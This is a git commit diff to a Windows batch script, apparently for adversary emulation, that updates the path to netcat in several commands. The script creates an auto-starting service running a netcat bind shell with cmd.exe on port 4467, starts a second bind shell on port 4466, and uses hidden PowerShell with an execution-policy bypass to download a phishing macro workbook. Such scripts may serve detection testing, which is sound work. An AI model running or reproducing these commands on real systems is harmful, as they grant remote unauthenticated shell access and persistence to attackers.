b3058fd9ac9fb0e0f444bc38e8c1f96ce209bbb9
inwestallis <inwestallis@gmail.com>
2020-02-25 11:50:44 +0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -9,13 +9,13 @@ copy %windir%\system32\certutil.exe %temp%\cr.tmp
 %Temp%\7z.exe a -mx1 %Temp%\netcat-win32-1.11.zip %Temp%\
 
 
-sc create XSample binPath= "cmd.exe /C %Temp%\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample
+sc create XSample binPath= "cmd.exe /C %Temp%\netcat-1.11\nc64.exe -nLvp 4467 -e cmd.exe" start= auto DisplayName= "XSample Service" & sc start XSample
 
 C:\Windows\system32\calc.exe
 
 powershell.exe -windowstyle hidden -ep Bypass -nop -noexit -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1193/bin/PhishingAttachment.xlsm?raw=true', 'C:\tools\s.xlsm')"
 
 
-%Temp%\nc64.exe -nLvp 4466 -e cmd.exe
+%Temp%\netcat-1.11\nc64.exe -nLvp 4466 -e cmd.exe
 
 
